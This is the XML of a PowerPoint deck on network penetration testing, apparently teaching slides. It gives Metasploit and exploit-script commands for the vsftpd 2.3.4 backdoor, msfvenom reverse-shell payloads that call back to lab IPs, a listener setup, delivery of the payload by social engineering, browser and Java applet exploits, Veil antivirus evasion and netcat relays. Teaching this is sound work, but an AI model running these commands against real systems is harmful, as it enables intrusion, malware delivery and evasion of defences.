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92" r:id="rId5"/>
    <p:sldId id="275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28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432A"/>
    <a:srgbClr val="446992"/>
    <a:srgbClr val="AEC2D8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3861" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="106" d="100"/>
          <a:sy n="106" d="100"/>
        </p:scale>
        <p:origin x="1434" y="114"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="1536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48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29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2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73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19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/>
              <a:t>Click to edit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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Dark Web Monitoring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Dark Web Monitoring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Dark Web Monitoring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851" y="1728730"/>
            <a:ext cx="7246036" cy="2038901"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Network Penetration Testing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dirty="0"/>
              <a:t>Network Penetration Testing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0724386-1D56-4B52-B481-7D721FF59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3498" y="401202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0B6309B-6A37-46EE-A176-3B0B2D46F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0068" y="2271296"/>
            <a:ext cx="1961017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endParaRPr lang="en-US" b="1" kern="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:latin typeface="Posterama Text Black (Headings)"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0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0EADE6A-9E39-49D4-ACA3-C8DBE5B44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091" y="568520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Agenda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sterama Text Black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19D6002-CFC1-466A-8404-5D57DD6C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67423"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Search For Exploits</a:t>
            </a:r>
            <a:endParaRPr lang="LID4096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AFC142-C825-4385-91E9-7616BED0433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/>
              <a:t>Network Penetration Testing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D79B5A-A342-49DD-950C-3E1CC4F07A3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053E2-D5EA-4930-8EF3-95E1F482DFDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484631" y="1182857"/>
            <a:ext cx="10261831" cy="3826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/>
              <a:t>Exploit-DB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https://www.exploit-db.com/search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https://www.exploit-db.com/searchsploit</a:t>
            </a:r>
          </a:p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 err="1"/>
              <a:t>searchsploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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searchsploit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--update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searchsploit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windows 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smb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remote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searchsploit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windows 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smb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--exclude="DNS|VLC"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="138475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2DFA-AB8D-4D41-B62D-8A83559EF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67423"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit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E7754-C633-483E-89E7-B888AAB5CFA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/>
              <a:t>Network Penetration Testing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918B4-5CC6-44B8-9A30-FBF9FE6FF70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1C7343-CB12-4A07-B45B-50D07DD54285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="1079919"/>
            <a:ext cx="11039192" cy="503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/>
              <a:t>Start Metasploit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service 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postgresql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start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update-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rc.d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postgresql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enable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msfdb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init</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRPr>
          </a:p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/>
              <a:t>Metasploit Modules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auxiliary	=&gt; some scripts for enumeration, scanning and etc...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exploits		=&gt; code to exploit the vulnerability and deliver the payload.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payloads	=&gt; the code that executed on the victim.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encoders	=&gt; encode the payloads to another form.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post		=&gt; post exploitation scripts.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nops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		=&gt; add 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nops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bytes.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evasion		=&gt; scripts for evasion.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41970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53E4-F1F0-419C-9862-948DB4D31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144937"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploite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5A13AE-E91F-4102-B57B-F3F286282B6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67B3B-FEDF-4A5D-A2D1-02FE1FD4F24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A1EF35-53B9-4CBC-861A-C66F5B079D93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="1507961"/>
            <a:ext cx="9690226" cy="3842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/>
              <a:t>Metasploit Commands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help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show {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all|exploits|payloads|auxiliary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}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search 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vsftpd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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search 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type:exploit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smb</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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use $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ModuleName</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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show info | show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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set $Variable $value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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exploit</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4228131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E2EC-9DE0-4893-9243-0421EB8FA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159668"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bind Shell vs Reverse Shell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D8F49-3ADE-4F77-B290-7435950EEAE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9EF08-0AA8-4715-90C0-61405E509BF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511579-B8D6-4603-85AA-06971306A51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719072" y="943200"/>
            <a:ext cx="8046720" cy="24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13B97D-A96C-4E7A-B631-769469D99D3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01952" y="3429000"/>
            <a:ext cx="7863840" cy="2579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558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E7EC0-B43C-42E3-856E-5811EBDD2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0"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Shell vs Meterpreter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0BA76-2019-4951-AE2D-AFA8042DD0C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24A0D-A047-425D-BD80-FEB5DDE6E41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FDAC50-37A6-40EA-BD9A-98A69CE30ED6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416000" y="1017270"/>
            <a:ext cx="9360000" cy="5029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335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5A37E-4AF9-41FE-972C-6712E9E69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161" y="61226"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Staged Payload vs Single Payload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FB2E2-156A-4EC1-B2F8-01BCCDE338F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9E53D-EB11-4BF8-981B-C25993C03FA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8211A7-58EC-4AD7-B5C3-6AFB6CE0EF91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416000" y="1176660"/>
            <a:ext cx="9360000" cy="4504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4645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4755-FC94-4859-84C1-9EFD3B8F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144937"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit Types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C8DC9-DF5F-4929-A5DC-1318776C52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16B8A-6468-49B4-B1FA-23987CC3689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E5B257-61D1-47DC-ADB6-E023FB32FDC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657885" y="1411838"/>
            <a:ext cx="10903389" cy="2759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/>
              <a:t>Service side exploits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To exploit service remotely.</a:t>
            </a:r>
          </a:p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/>
              <a:t>Client side exploits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Social engineering (sending link or file).</a:t>
            </a:r>
          </a:p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/>
              <a:t>Local exploits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Privilege escalations (normal user to root).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3531244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F119-C98B-4366-AA31-E145658B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153991"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Service Side Exploit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CB770-F0B6-45D8-BBA6-6886B21FAFB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56E31-2B21-4063-A208-FE328CEED41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B7CD1-F202-4AE5-A3A9-1A1F704C579A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587829" y="1422587"/>
            <a:ext cx="10179113" cy="4673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sz="2400" b="1" dirty="0"/>
              <a:t>Linux vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> 2.3.4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use exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a: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/ftp/vsftpd_234_backdoor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show options | show info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set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>rhosts</a:t>
            </a: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 192.168.1.115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show payloads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set payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>cmd</a:t>
            </a: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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a: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/interact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exploit -j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sessions -l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sessions -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34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582742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61B3-0AA5-468F-8E4A-FC155536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274955"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Service Side Exploit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F9D7F-29D8-4120-A75B-8C4DE5DD2C6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EDE14-493E-4909-B84D-B4111F1B6F1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2323FB-CEB5-4C6D-98D8-C4ED2134C24B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="386280" y="1708886"/>
            <a:ext cx="12062235" cy="2698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/>
              <a:t>Linux vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> 2.3.4 Manual Search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https://raw.githubusercontent.com/In2econd/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py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python3 vsftpd_234_exploit.py 192.168.1.115 21 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whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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python3 vsftpd_234_exploit.py 192.168.1.115 21 "cat /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etc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/passwd"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2817131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CC822-8C8D-44D2-95C7-489234B54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67423"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client Side Exploit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EC789-C6F3-40E0-AEB5-8A8E00F0590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13B85-54B2-432E-BF51-BA0713963F5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D38219-C4CC-4FE5-B1BF-8483AF1CAD66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="372701" y="1071344"/>
            <a:ext cx="11446598" cy="4534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/>
              <a:t>Generate Malicious File, Setup a Listener, Send to Target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Use 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msfvenom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to generate reverse shell malicious file.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Setup a listener with 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metasploit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to receive the reverse shell connection.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Send the malicious file to the victim.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The victim execute the malicious file.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Then we get the reverse shell connection and get full control over the victim PC.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2277878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8EC3-72B8-448A-AED1-4959853EB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66" y="0"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client Side Exploit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17754-B2A6-4893-9437-7615D8D9822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E53544-8718-43F5-8B71-39FE185BF9A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="157573" y="817364"/>
            <a:ext cx="11446598" cy="5765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/>
              <a:t>Generate Malicious File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msfvenom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-l payloads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msfvenom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-p windows/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meterpreter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/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reverse_tcp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LHOST=10.0.2.15 LPORT=4444 -f exe &gt; file.exe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msfvenom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-p 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linux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/x86/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meterpreter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/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reverse_tcp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LHOST=10.0.2.15 LPORT=4444 -f elf &gt; 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file.elf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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msfvenom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-p python/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meterpreter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/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reverse_tcp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 LHOST=10.0.2.15 LPORT=4444 -o file.py</a:t>
            </a:r>
          </a:p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/>
              <a:t>Setup a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>listesner</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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use exploit/multi/handler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set PAYLOAD windows/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meterpreter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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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set LHOST 10.0.2.15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show options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exploit</a:t>
            </a:r>
          </a:p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/>
              <a:t>Send to target (Social Engineering)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python -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>http.server </a:t>
            </a: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(http://192.168.43.8:8000/file.exe)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3839890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92AB-328D-442E-A212-2FB43E0E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67423"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client Side Exploit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92496-A501-470E-BFEC-6FB5D3FB8E8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AEE4B-2D86-4C2B-B7C7-90D0810F239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C1BB67-C013-4D69-8964-DC4784E0EE49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587829" y="1275178"/>
            <a:ext cx="9835081" cy="2698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/>
              <a:t>Browser Exploit (Internet Explorer 8 vulnerable to MS12-037)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https://www.exploit-db.com/exploits/24017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Generate Reverse Shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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msfvenom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-p windows/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shell_reverse_tcp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LHOST=192.168.43.8 LPORT=4444 -f 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js_le</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold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910714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8483-C828-4FA3-846E-BC55F2CE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144937"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Client Side Exploit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071B6-BB93-46D5-9E79-15008DAEEB7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49E16-F46F-41E3-A401-4F3AB319C07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086A48-9715-4569-B553-63984040F39D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587829" y="1533413"/>
            <a:ext cx="10369236" cy="220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/>
              <a:t>Java Applet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use exploit/multi/browser/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java_signed_applet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2C3E50"/>
              </a:solidFill>
              <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
            </a:endParaRP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show options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exploit</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1545918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60D9-0837-4CCC-94C2-D2551F88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-35701"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>AntiVirus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Evasion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D51130-AAE3-4E63-BC71-B45FB5A3CD0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D34E0-2B53-4CF6-91FC-5445D23FDBA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11A19-3F96-4890-98D4-CE0EB76A2160}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="935589"/>
            <a:ext cx="11401331" cy="4639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/>
              <a:t>Veil Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="113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git clone https://github.com/Veil-Framework/Veil.git</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="113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cd Veil &amp;&amp; ./config/setup.sh --force --silent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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use Evasion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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use powershell/meterpreter/rev_https.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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set LHOST 192.168.1.114</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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Generate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2C3E50"/>
                </a:solidFill>
                <a:latin typeface="Source Sans Pro Semibold" pitchFamily="34"/>
              </a:rPr>
              <a:t>exit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcAft>
                <a:spcPts val="1134"/>
              </a:spcAft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/>
              <a:t>/var/lib/veil/output/source/payload.bat</a:t>
            </a:r>
          </a:p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/>
              <a:t>/var/lib/veil/output/handlers/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>payload.rc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63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CEC9D-43F9-4A11-9379-01D6FB18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0"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Port Forwarding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F50167-E97B-4784-BFB5-E5DC80F805B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47B83-CE3C-4630-8A4C-BF44D26D145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17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774408-2D83-4B90-A052-80A2FABE5D2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 l="2999" t="3153" r="3345" b="1648"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2301891" y="1158438"/>
            <a:ext cx="7087476" cy="4893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4867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65A7-0A67-4B97-AEA4-825662B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67423"/>
            <a:ext cx="10515600" cy="1115434"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Port Forwarding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E4310-7884-4D63-936F-3CB988D3E01C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19230-FB16-44B2-95A3-E611B427F9F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A0F93B-BC82-46E1-BA34-5D5956C96DFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587829" y="1182857"/>
            <a:ext cx="10305861" cy="337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C3E50"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="StarSymbol"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NetCat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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mknod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relaynode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p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nc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127.0.0.1 1111 #attacker machine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nc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-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lvnp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1111 0&lt;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relaynode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| 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nc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127.0.0.1 22 1&gt;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relaynode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#bridge machine</a:t>
            </a:r>
          </a:p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  <a:buFont typeface="StarSymbol"/>
              <a:buChar char="–"/>
            </a:pP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nc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-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lnvp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22 #target machine</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4016921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FE1B373C7A1A409814D857F1C07B2D" ma:contentTypeVersion="8" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="efbabde706a642e9fbc2e99012c0f8f5">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns3="6ecf743a-e3f7-4ee6-8b28-da9927c3bbb6" xmlns:ns4="ca188c30-1b6b-4f9a-99c8-2f56da8f2e99" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="d77aac5b45e29c25afe48725f483bb33" ns3:_="" ns4:_="">
    <xsd:import namespace="6ecf743a-e3f7-4ee6-8b28-da9927c3bbb6"/>
    <xsd:import namespace="ca188c30-1b6b-4f9a-99c8-2f56da8f2e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cf743a-e3f7-4ee6-8b28-da9927c3bb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188c30-1b6b-4f9a-99c8-2f56da8f2e9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ecf743a-e3f7-4ee6-8b28-da9927c3bbb6" xsi:nil="true"/>
  </documentManagement>
</p:properties>
</file>

<file path=customXml/itemProps1.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{D5525406-4350-4D47-BA87-A77EC33ACA7E}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="6ecf743a-e3f7-4ee6-8b28-da9927c3bbb6"/>
    <ds:schemaRef ds:uri="ca188c30-1b6b-4f9a-99c8-2f56da8f2e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AD9BE2-6B3D-4616-B044-300A8177DEA5}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="ca188c30-1b6b-4f9a-99c8-2f56da8f2e99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6ecf743a-e3f7-4ee6-8b28-da9927c3bbb6"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls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6423</TotalTime>
  <Words>760</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>149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等线</vt:lpstr>
      <vt:lpstr>Abadi</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Posterama</vt:lpstr>
      <vt:lpstr>Posterama Text Black</vt:lpstr>
      <vt:lpstr>Posterama Text Black (Headings)</vt:lpstr>
      <vt:lpstr>Posterama Text SemiBold</vt:lpstr>
      <vt:lpstr>Source Sans Pro Semibold</vt:lpstr>
      <vt:lpstr>StarSymbol</vt:lpstr>
      <vt:lpstr>Custom​​</vt:lpstr>
      <vt:lpstr>Network Penetration Testing</vt:lpstr>
